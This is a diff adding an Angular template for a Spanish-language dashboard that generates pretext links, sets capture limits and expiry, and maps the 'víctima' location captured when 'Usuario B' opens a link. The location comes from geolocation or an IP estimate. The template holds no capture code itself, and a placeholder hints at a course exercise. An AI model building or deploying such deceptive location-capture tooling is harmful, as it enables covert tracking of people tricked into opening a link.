@@ -1,0 +1,192 @@
+<div class="min-h-screen bg-gray-50">
+  <header class="flex items-center justify-between px-4 sm:px-6 py-4 bg-white border-b">
+    <h1 class="text-lg sm:text-xl font-semibold text-gray-800">BACKUBI — Dashboard</h1>
+    <button
+      type="button"
+      (click)="cerrarSesion()"
+      class="text-sm text-gray-500 hover:text-gray-800"
+    >
+      Cerrar sesión
+    </button>
+  </header>
+
+  <div class="max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
+    <!-- Sección: Generar enlace -->
+    <section class="bg-white rounded-lg shadow p-4 sm:p-6">
+      <h2 class="font-medium text-gray-800 mb-4">Generar enlace</h2>
+
+      <form class="grid grid-cols-1 lg:grid-cols-2 gap-6" (ngSubmit)="crearEnlace()">
+        <!-- Columna de campos -->
+        <div class="space-y-3 order-2 lg:order-1">
+          <div>
+            <label class="block text-xs text-gray-500 mb-1" for="etiqueta">
+              Etiqueta interna (opcional)
+            </label>
+            <input
+              id="etiqueta"
+              name="etiqueta"
+              type="text"
+              [(ngModel)]="nuevaEtiqueta"
+              placeholder="Ej. prueba curso - grupo 3"
+              class="w-full border rounded px-3 py-2 text-sm"
+            />
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <div>
+              <label class="block text-xs text-gray-500 mb-1" for="maxCapturas">
+                Máx. capturas
+              </label>
+              <input
+                id="maxCapturas"
+                name="maxCapturas"
+                type="number"
+                min="1"
+                [(ngModel)]="nuevoMaxCapturas"
+                class="w-full border rounded px-3 py-2 text-sm"
+              />
+            </div>
+            <div>
+              <label class="block text-xs text-gray-500 mb-1" for="expiraEn">
+                Expira (opcional)
+              </label>
+              <input
+                id="expiraEn"
+                name="expiraEn"
+                type="datetime-local"
+                [(ngModel)]="nuevaExpiraEn"
+                class="w-full border rounded px-3 py-2 text-sm"
+              />
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-xs text-gray-500 mb-1" for="pretextoTexto">
+              Texto del pretexto (lo que ve el Usuario B)
+            </label>
+            <input
+              id="pretextoTexto"
+              name="pretextoTexto"
+              type="text"
+              [(ngModel)]="nuevoPretextoEtiqueta"
+              placeholder="Ej. Mira este lugar que encontré"
+              class="w-full border rounded px-3 py-2 text-sm"
+            />
+          </div>
+
+          @if (error()) {
+            <p class="text-red-600 text-sm">{{ error() }}</p>
+          }
+
+          <button
+            type="submit"
+            [disabled]="creando()"
+            class="w-full bg-gray-900 text-white rounded px-3 py-2 text-sm disabled:opacity-50"
+          >
+            {{ creando() ? 'Creando…' : 'Generar enlace' }}
+          </button>
+        </div>
+
+        <!-- Columna del mapa selector -->
+        <div class="order-1 lg:order-2">
+          <label class="block text-xs text-gray-500 mb-1">
+            Ubicación del pretexto — haz click en el mapa para elegirla
+          </label>
+          <div
+            #mapaPretextoContainer
+            class="w-full rounded border"
+            style="height: 320px"
+          ></div>
+          <p class="text-xs text-gray-400 mt-1">
+            {{ pretextoLat().toFixed(5) }}, {{ pretextoLon().toFixed(5) }}
+          </p>
+        </div>
+      </form>
+    </section>
+
+    <!-- Sección: Ubicación víctima -->
+    <section class="bg-white rounded-lg shadow p-4 sm:p-6">
+      <h2 class="font-medium text-gray-800 mb-2">Ubicación víctima</h2>
+      <p class="text-xs text-amber-700 bg-amber-50 border border-amber-200 rounded px-3 py-2 mb-4">
+        Aquí aparecerá la ubicación real del Usuario B, solo si abre el enlace y la captura
+        se completa (con permiso de geolocalización o, si lo rechaza, un estimado por IP).
+      </p>
+      <div
+        #mapaContainer
+        class="w-full rounded border"
+        style="height: 400px"
+      ></div>
+    </section>
+
+    <!-- Sección: Mis enlaces -->
+    <section class="bg-white rounded-lg shadow p-4 sm:p-6">
+      <h2 class="font-medium text-gray-800 mb-4">Mis enlaces</h2>
+
+      @if (enlaces().length === 0) {
+        <p class="text-gray-400 text-sm">Todavía no generaste ningún enlace.</p>
+      }
+
+      <ul class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        @for (enlace of enlaces(); track enlace.id) {
+          <li
+            (click)="toggleUbicacion(enlace.id)"
+            class="border-2 rounded p-3 text-sm transition-colors"
+            [class.cursor-pointer]="tieneUbicacion(enlace.id)"
+            [class.hover:border-gray-300]="tieneUbicacion(enlace.id) && !estaSeleccionado(enlace.id)"
+            [class.border-gray-200]="!estaSeleccionado(enlace.id)"
+            [class.border-amber-400]="estaSeleccionado(enlace.id) && esLaUltima(enlace.id)"
+            [class.bg-amber-50]="estaSeleccionado(enlace.id) && esLaUltima(enlace.id)"
+            [class.border-blue-400]="estaSeleccionado(enlace.id) && !esLaUltima(enlace.id)"
+            [class.bg-blue-50]="estaSeleccionado(enlace.id) && !esLaUltima(enlace.id)"
+          >
+            <div class="flex items-center justify-between gap-2">
+              <span class="font-mono text-xs truncate">{{ urlDe(enlace.token) }}</span>
+              <span
+                class="text-xs px-2 py-0.5 rounded shrink-0"
+                [class.bg-green-100]="enlace.activo"
+                [class.text-green-700]="enlace.activo"
+                [class.bg-gray-100]="!enlace.activo"
+                [class.text-gray-500]="!enlace.activo"
+              >
+                {{ enlace.activo ? 'activo' : 'inactivo' }}
+              </span>
+            </div>
+            @if (enlace.etiqueta) {
+              <p class="text-gray-500 text-xs mt-1">{{ enlace.etiqueta }}</p>
+            }
+            @if (tieneUbicacion(enlace.id)) {
+              <p class="text-xs mt-1" [class.text-amber-700]="esLaUltima(enlace.id)" [class.text-blue-700]="!esLaUltima(enlace.id)">
+                📍 {{ esLaUltima(enlace.id) ? 'Última ubicación compartida' : 'Ubicación capturada' }}
+                — {{ estaSeleccionado(enlace.id) ? 'visible en el mapa' : 'click para ver en el mapa' }}
+              </p>
+            }
+            <div class="flex gap-2 mt-3" (click)="$event.stopPropagation()">
+              <button
+                type="button"
+                (click)="copiarUrl(enlace)"
+                [disabled]="!enlace.activo"
+                class="flex-1 text-xs font-medium rounded px-3 py-1.5 transition-colors
+                  disabled:bg-gray-100 disabled:text-gray-400 disabled:cursor-not-allowed"
+                [class.bg-blue-600]="enlace.activo && copiadoId() !== enlace.id"
+                [class.text-white]="enlace.activo"
+                [class.hover:bg-blue-700]="enlace.activo && copiadoId() !== enlace.id"
+                [class.bg-green-600]="copiadoId() === enlace.id"
+              >
+                {{ copiadoId() === enlace.id ? '✓ ¡Copiado!' : 'Copiar enlace' }}
+              </button>
+              @if (enlace.activo) {
+                <button
+                  type="button"
+                  (click)="desactivarEnlace(enlace.id)"
+                  class="text-xs text-red-600 hover:underline px-2"
+                >
+                  Desactivar
+                </button>
+              }
+            </div>
+          </li>
+        }
+      </ul>
+    </section>
+  </div>
+</div>
